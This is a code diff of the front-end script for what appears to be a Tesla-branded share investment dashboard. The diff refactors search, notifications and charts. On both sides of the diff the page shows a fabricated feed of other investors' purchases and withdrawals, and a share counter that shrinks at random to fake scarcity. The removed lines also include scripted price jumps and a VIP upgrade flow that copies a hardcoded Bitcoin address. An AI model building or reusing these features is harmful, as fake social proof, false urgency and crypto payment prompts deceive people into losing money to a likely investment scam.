             }, 50);
-            renderSearchResults(""); 
+            renderSearchResults("");
         });
 
-        function closeSearchModal() {
-            searchModal.classList.remove("opacity-100");
-            searchModal.classList.add("opacity-0");
-            setTimeout(() => {
-                searchModal.classList.add("hidden");
-                searchInput.value = "";
-            }, 200);
-        }
-        closeSearchBtn.addEventListener("click", closeSearchModal);
+        document.getElementById("closeSearchBtn").addEventListener("click", () => {
+            const modal = document.getElementById("searchModal");
+            modal.classList.add("opacity-0");
+            setTimeout(() => modal.classList.add("hidden"), 200);
+        });
 
-        searchInput.addEventListener("input", (e) => {
+        document.getElementById("searchInput").addEventListener("input", (e) => {
             renderSearchResults(e.target.value);
         });
 
-        function initializePrivatePoolCounter() {
-            let runningShares = 1240;
-            const totalShares = 10000;
-            const textEl = document.getElementById('sharesRemainingText');
-            const percentEl = document.getElementById('sharesPercentageText');
-            const barEl = document.getElementById('sharesProgressBar');
-
-            function updatePoolUI() {
-                textEl.innerText = runningShares.toLocaleString();
-                const precisionFilledPercent = (((totalShares - runningShares) / totalShares) * 100).toFixed(1);
-                percentEl.innerText = `${precisionFilledPercent}%`;
-                barEl.style.width = `${precisionFilledPercent}%`;
-            }
-
-            function subtractRandomShares() {
-                const customDelay = Math.floor(Math.random() * (15000 - 8000 + 1)) + 8000;
-                setTimeout(() => {
-                    if (runningShares > 184) {
-                        const chunksToSubtract = Math.floor(Math.random() * 8) + 2;
-                        runningShares -= chunksToSubtract;
-                        updatePoolUI();
-                    }
-                    subtractRandomShares();
-                }, customDelay);
-            }
-
-            updatePoolUI();
-            subtractRandomShares();
-        }
-
         function renderSearchResults(query) {
-            const cleanQuery = query.toLowerCase().trim();
-            const filtered = searchDatabase.filter(item => item.name.toLowerCase().includes(cleanQuery));
-
+            const filtered = searchDatabase.filter(item => item.name.toLowerCase().includes(query.toLowerCase().trim()));
+            const results = document.getElementById("searchResults");
             if (filtered.length === 0) {
-                searchResults.innerHTML = `<div class="p-4 text-center text-xs text-neutral-500 font-mono">No matching network records found.</div>`;
+                results.innerHTML = `<div class="p-4 text-center text-xs text-neutral-500">No matching records found.</div>`;
             } else {
-                searchResults.innerHTML = filtered.map(item => `
-                    <a href="${item.url}" class="flex items-center justify-between p-3.5 hover:bg-neutral-900/60 transition-colors group">
-                        <span class="text-xs text-neutral-200 font-medium group-hover:text-white">${item.name}</span>
-                        <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-500 font-mono tracking-wider px-2 py-0.5 rounded-md uppercase">${item.category}</span>
+                results.innerHTML = filtered.map(item => `
+                    <a href="${item.url}" class="flex items-center justify-between p-3.5 hover:bg-neutral-900/60 transition-colors">
+                        <span class="text-xs text-neutral-200 font-medium">${item.name}</span>
+                        <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-500 font-mono px-2 py-0.5 rounded-md uppercase">${item.category}</span>
                     </a>
                 `).join('');
             }
-            searchResults.classList.remove("hidden");
+            results.classList.remove("hidden");
         }
 
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        function playPremiumChime(isClearAction) {
-            try {
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                osc.type = 'sine';
-                if(isClearAction) {
-                    osc.frequency.setValueAtTime(520, audioCtx.currentTime);
-                    osc.frequency.exponentialRampToValueAtTime(220, audioCtx.currentTime + 0.25);
-                } else {
-                    osc.frequency.setValueAtTime(880, audioCtx.currentTime);
-                }
-                gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.25);
-                osc.start();
-                osc.stop(audioCtx.currentTime + 0.25);
-            } catch(e){}
-        }
-
-        const notiBellBtn = document.getElementById("notiBellBtn");
-        const notiMenu = document.getElementById("notiMenu");
-
-        notiBellBtn.addEventListener("click", (e) => {
+        // Notifications
+        document.getElementById("notiBellBtn").addEventListener("click", (e) => {
             e.stopPropagation();
-            if(notiMenu.classList.contains("hidden")) {
-                playPremiumChime(false);
-                notiMenu.classList.remove("hidden");
+            const menu = document.getElementById("notiMenu");
+            if (menu.classList.contains("hidden")) {
+                menu.classList.remove("hidden");
                 setTimeout(() => {
-                    notiMenu.classList.remove("scale-95", "opacity-0");
-                    notiMenu.classList.add("scale-100", "opacity-100");
+                    menu.classList.remove("scale-95", "opacity-0");
+                    menu.classList.add("scale-100", "opacity-100");
                 }, 10);
             } else {
-                closeNotiMenu();
-            }
-        });
-
-        function closeNotiMenu() {
-            notiMenu.classList.remove("scale-100", "opacity-100");
-            notiMenu.classList.add("scale-95", "opacity-0");
-            setTimeout(() => notiMenu.classList.add("hidden"), 150);
-        }
-
-        document.addEventListener("click", (e) => {
-            if(!notiMenu.contains(e.target) && e.target !== notiBellBtn) {
-                if(!notiMenu.classList.contains("hidden")) closeNotiMenu();
+                menu.classList.add("scale-95", "opacity-0");
+                setTimeout(() => menu.classList.add("hidden"), 150);
             }
         });
 
         function clearSystemNotifications() {
-            playPremiumChime(true);
             document.getElementById("notiListContainer").innerHTML = `
-                <div class="p-6 text-center text-neutral-600 text-[10px] uppercase font-mono tracking-wider">
-                    Terminal Log Clear // 0 Messages
-                </div>`;
+                <div class="p-6 text-center text-neutral-600 text-[10px] uppercase font-mono">Terminal Log Clear // 0 Messages</div>`;
             const badge = document.getElementById("notiBadge");
-            if (badge) {
-                badge.classList.add("scale-0", "opacity-0");
-                setTimeout(() => badge.remove(), 200);
-            }
+            if (badge) badge.remove();
         }
 
-        // Toggle Balance & Profit Visibility
-        let balanceVisible = true;
-        let profitVisible = true;
-
-        function toggleBalanceVisibility() {
-            balanceVisible = !balanceVisible;
-            document.getElementById('totalBalance').style.opacity = balanceVisible ? '1' : '0';
-            document.getElementById('balanceEye').textContent = balanceVisible ? '👁️' : '🙈';
-        }
-
-        function toggleProfitVisibility() {
-            profitVisible = !profitVisible;
-            document.getElementById('totalProfit').style.opacity = profitVisible ? '1' : '0';
-            document.getElementById('profitEye').textContent = profitVisible ? '👁️' : '🙈';
-        }
-
-        // Verification Modal
-        function showVerificationModal() {
-            document.getElementById('verificationModal').classList.remove('hidden');
-        }
-
-        function closeVerificationModal() {
-            document.getElementById('verificationModal').classList.add('hidden');
-        }
-
-        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            alert("Verification request submitted! (This is a demo - saved in Apps Script)");
-            closeVerificationModal();
-            document.getElementById('verificationStatus').innerText = "Verification Pending";
-        });
-
-        // VIP Upgrade Modal
-        function showVipUpgradeModal() {
-            document.getElementById('vipModal').classList.remove('hidden');
-        }
-
-        function closeVipModal() {
-            document.getElementById('vipModal').classList.add('hidden');
-        }
-
-        function copyBtcAddress() {
-            const address = "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e";
-            navigator.clipboard.writeText(address).then(() => {
-                alert("BTC Address copied!");
-            });
-        }
-
-        // Futures Tabs
-        function switchTab(tab) {
-            // Simple demo - you can expand later
-            if (tab === 0) {
-                document.getElementById('futuresContent').style.display = 'block';
-            } else {
-                alert("This tab is coming soon");
-            }
-        }
-
-        function viewAllFutures() {
-            alert("Opening full Futures list (you can create a new page later)");
-        }
-
-        if (!userId) {
-            window.location.href = "index.html";
-        } else {
-            document.getElementById('userName').innerText = fullName || "Investor";
-            const savedAvatar = localStorage.getItem("userAvatarImage");
-            if (savedAvatar) {
-                document.getElementById('avatarContainer').innerHTML = `<img src="${savedAvatar}" class="w-full h-full object-cover">`;
-            } else if (fullName) {
-                const initials = fullName.split(" ").map(n => n[0]).join("").toUpperCase().substring(0, 2);
-                document.getElementById('avatarContainer').innerText = initials;
-            }
-            loadDashboardMetrics();
-            initializePremiumCharts();
-            initializeLiveActivityFeed();
-            initializePrivatePoolCounter();
-            loadTransactions(); // Load real transactions
-        }
-
-        function formatCurrency(val) {
-            const num = parseFloat(String(val).replace(/[^0-9.-]+/g,"")) || 0;
-            return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(num);
-        }
-
-        async function loadDashboardMetrics() {
-            try {
-                const response = await fetch(API_URL, {
-                    method: "POST",
-                    mode: "cors",
-                    headers: { "Content-Type": "text/plain" },
-                    body: JSON.stringify({ action: "getDashboardData", userId: userId })
-                });
-                const result = await response.json();
-                if (result.status === "success") {
-                    document.getElementById('totalBalance').innerText = formatCurrency(result.account.balance);
-                    document.getElementById('totalProfit').innerText = formatCurrency(result.account.profit);
-                } else {
-                    document.getElementById('totalBalance').innerText = "Error";
-                    document.getElementById('totalProfit').innerText = "Error";
-                }
-            } catch (err) {
-                document.getElementById('totalBalance').innerText = "Disconnected";
-                document.getElementById('totalProfit').innerText = "Disconnected";
-            }
-        }
-
+        // Charts
         function initializePremiumCharts() {
             const ctxLine = document.getElementById('deliveryChart').getContext('2d');
             const gradient = ctxLine.createLinearGradient(0, 0, 0, 150);
             gradient.addColorStop(0, 'rgba(232, 33, 39, 0.45)');
             gradient.addColorStop(1, 'rgba(232, 33, 39, 0)');
 
-            const teslaChart = new Chart(ctxLine, {
+            new Chart(ctxLine, {
                 type: 'line',
                 data: {
-                    labels: ['JUL 10', 'AUG', 'SEP', 'OCT 11', 'NOV', 'DEC', 'JAN', 'FEB 13', 'MAR', 'APR', 'MAY 14', 'JUN', 'JUL', 'AUG 15'],
+                    labels: ['JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC', 'JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG'],
                     datasets: [{
                         data: [980, 1250, 1180, 1620, 1480, 1750, 2100, 2850, 5200, 7800, 10500, 9200, 11800, 15200],
                         borderColor: '#E82127',
-                        borderWidth: 3.5,
+                        borderWidth: 3,
                         tension: 0.35,
                         fill: true,
                         backgroundColor: gradient,
-                        pointRadius: 0,
-                        borderCapStyle: 'round',
-                        borderJoinStyle: 'round'
+                        pointRadius: 0
                     }]
                 },
                 options: {
                     responsive: true,
                     maintainAspectRatio: false,
-                    animation: { duration: 4200, easing: 'easeOutExpo' },
                     plugins: { legend: { display: false }, tooltip: { enabled: false } },
                     scales: {
-                        x: { grid: { display: false, color: '#222' }, ticks: { color: '#666', font: { size: 9 } } },
-                        y: { grid: { color: '#1a1a1a' }, ticks: { color: '#666', font: { size: 9 }, callback: function(value) { return '$' + value/1000 + 'K'; } } }
+                        x: { grid: { display: false }, ticks: { color: '#666', font: { size: 9 } } },
+                        y: { grid: { color: '#1a1a1a' }, ticks: { color: '#666', font: { size: 9 }, callback: v => '$' + v/1000 + 'K' } }
                     }
                 }
             });
-
-            // Live price updater
-            let currentPrice = 4228;
-            const priceLabels = [4228, 6386, 8322, 10000, 9826, 11000, 9056, 13000, 15200];
-            let priceIndex = 0;
-
-            setInterval(() => {
-                if (priceIndex < priceLabels.length - 1) {
-                    priceIndex++;
-                    currentPrice = priceLabels[priceIndex];
-                    teslaChart.data.datasets[0].data[teslaChart.data.datasets[0].data.length - 1] = currentPrice;
-                    teslaChart.update('none');
-                }
-            }, 900);
 
             const ctxDonut = document.getElementById('portfolioChart').getContext('2d');
             new Chart(ctxDonut, {
@@ -756,8 +628,7 @@
                     datasets: [{
                         data: [70, 20, 10],
                         backgroundColor: ['#E82127', '#2a2a2a', '#5c5c5c'],
-                        borderWidth: 0,
-                        hoverOffset: 4
+                        borderWidth: 0
                     }]
                 },
                 options: {
@@ -769,92 +640,75 @@
             });
         }
 
+        // Live Activity Feed
         function initializeLiveActivityFeed() {
             const feedData = [
                 { text: 'Investor ID ***482 just purchased 45 Tesla Shares (<span class="text-emerald-400 font-mono font-semibold">$2,500</span>)', time: '2 mins ago' },
                 { text: 'Investor ID ***911 withdrew <span class="text-neutral-400 font-mono font-semibold">$1,400</span> to Bank Account', time: '12 mins ago' },
-                { text: 'Investor ID ***104 added position capital pipeline (<span class="text-emerald-400 font-mono font-semibold">$10,250</span> via USDT)', time: 'Just now' },
-                { text: 'Investor ID ***661 secured 15 fractional equities (<span class="text-emerald-400 font-mono font-semibold">$850</span>)', time: '4 mins ago' },
-                { text: 'Investor ID ***319 clearing system payout of <span class="text-neutral-400 font-mono font-semibold">$4,100</span> complete', time: '22 mins ago' },
-                { text: 'Investor ID ***882 initialized institutional collateral allocation (<span class="text-emerald-400 font-mono font-semibold">$15,000</span>)', time: '1 min ago' }
+                { text: 'Investor ID ***104 added capital (<span class="text-emerald-400 font-mono font-semibold">$10,250</span> via USDT)', time: 'Just now' },
+                { text: 'Investor ID ***661 secured 15 fractional equities (<span class="text-emerald-400 font-mono font-semibold">$850</span>)', time: '4 mins ago' }
             ];
-
-            const containerBox = document.getElementById('liveActivityBox');
+            let currentIndex = 0;
+            const box = document.getElementById('liveActivityBox');
             const textBox = document.getElementById('activityText');
             const timeBox = document.getElementById('activityTime');
-            let currentIndex = 0;
 
-            function cycleFeed() {
-                containerBox.classList.remove('translate-y-0', 'opacity-100');
-                containerBox.classList.add('-translate-y-2', 'opacity-0');
-
+            function cycle() {
+                box.classList.add('opacity-0', '-translate-y-2');
                 setTimeout(() => {
                     currentIndex = (currentIndex + 1) % feedData.length;
-                    const currentItem = feedData[currentIndex];
-                    textBox.innerHTML = currentItem.text;
-                    timeBox.innerText = currentItem.time;
-                    containerBox.classList.remove('-translate-y-2');
-                    containerBox.classList.add('translate-y-2');
-
+                    textBox.innerHTML = feedData[currentIndex].text;
+                    timeBox.innerText = feedData[currentIndex].time;
+                    box.classList.remove('-translate-y-2');
+                    box.classList.add('translate-y-2');
                     setTimeout(() => {
-                        containerBox.classList.remove('translate-y-2', 'opacity-0');
-                        containerBox.classList.add('translate-y-0', 'opacity-100');
+                        box.classList.remove('opacity-0', 'translate-y-2');
                     }, 50);
-                }, 500);
+                }, 400);
             }
-
-            function queueNextCycle() {
-                const randomizedInterval = Math.floor(Math.random() * (10000 - 6000 + 1)) + 6000;
-                setTimeout(() => {
-                    cycleFeed();
-                    queueNextCycle();
-                }, randomizedInterval);
-            }
-            queueNextCycle();
+            setInterval(cycle, 7000);
         }
 
-        // NEW: Load Real Transactions from Google Sheet
-        async function loadTransactions() {
-            const container = document.getElementById('transactionsList');
-            container.innerHTML = '<div class="text-center py-8 text-neutral-500">Loading real transactions...</div>';
-
-            try {
-                const response = await fetch(API_URL, {
-                    method: "POST",
-                    mode: "cors",
-                    headers: { "Content-Type": "text/plain" },
-                    body: JSON.stringify({ action: "getTransactionHistory", userId: userId })
-                });
-                const result = await response.json();
-
-                if (result.status === "success" && result.transactions && result.transactions.length > 0) {
-                    container.innerHTML = result.transactions.map(tx => `
-                        <div class="flex items-center justify-between bg-neutral-950/50 rounded-xl p-3 border border-neutral-800">
-                            <div class="flex items-center space-x-3">
-                                <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 text-lg">↓</div>
-                                <div>
-                                    <p class="text-sm font-medium text-neutral-200">${tx.asset || 'Transfer'}</p>
-                                    <p class="text-[10px] text-neutral-500 font-mono">${tx.vehicle || 'Outbound'}</p>
-                                </div>
-                            </div>
-                            <div class="text-right">
-                                <p class="text-emerald-400 font-medium font-mono">+$${parseFloat(tx.amount).toFixed(2)}</p>
-                                <p class="text-[10px] text-neutral-500">${tx.timestamp}</p>
-                            </div>
-                        </div>
-                    `).join('');
-                } else {
-                    container.innerHTML = `<div class="text-center py-8 text-neutral-500">No transactions found yet.</div>`;
+        // Private Pool Counter
+        function initializePrivatePoolCounter() {
+            let runningShares = 1240;
+            const total = 10000;
+            setInterval(() => {
+                if (runningShares > 200) {
+                    runningShares -= Math.floor(Math.random() * 6) + 1;
+                    document.getElementById('sharesRemainingText').innerText = runningShares.toLocaleString();
+                    const pct = (((total - runningShares) / total) * 100).toFixed(1);
+                    document.getElementById('sharesPercentageText').innerText = pct + '%';
+                    document.getElementById('sharesProgressBar').style.width = pct + '%';
                 }
-            } catch (err) {
-                container.innerHTML = `<div class="text-center py-8 text-red-400">Could not load transactions from sheet.</div>`;
-            }
+            }, 9000);
         }
 
-        // Call it when dashboard loads
-        window.onload = function() {
-            if (userId) loadTransactions();
-        };
+        // ========== INIT ==========
+        document.getElementById('userName').innerText = fullName || "Investor";
+        
+        const savedAvatar = localStorage.getItem("userAvatarImage");
+        if (savedAvatar) {
+            document.getElementById('avatarContainer').innerHTML = `<img src="${savedAvatar}" class="w-full h-full object-cover">`;
+        } else if (fullName) {
+            const initials = fullName.split(" ").map(n => n[0]).join("").toUpperCase().substring(0, 2);
+            document.getElementById('avatarContainer').innerText = initials;
+        }
+
+        // Load real data
+        loadDashboardMetrics();
+        loadTransactions();
+        initializePremiumCharts();
+        initializeLiveActivityFeed();
+        initializePrivatePoolCounter();
+
+        // Verification form
+        document.getElementById('verificationForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            alert("Verification request submitted!");
+            closeVerificationModal();
+            document.getElementById('verificationStatus').innerText = "Verification Pending";
+        });
     </script>
 </body>
 </html>
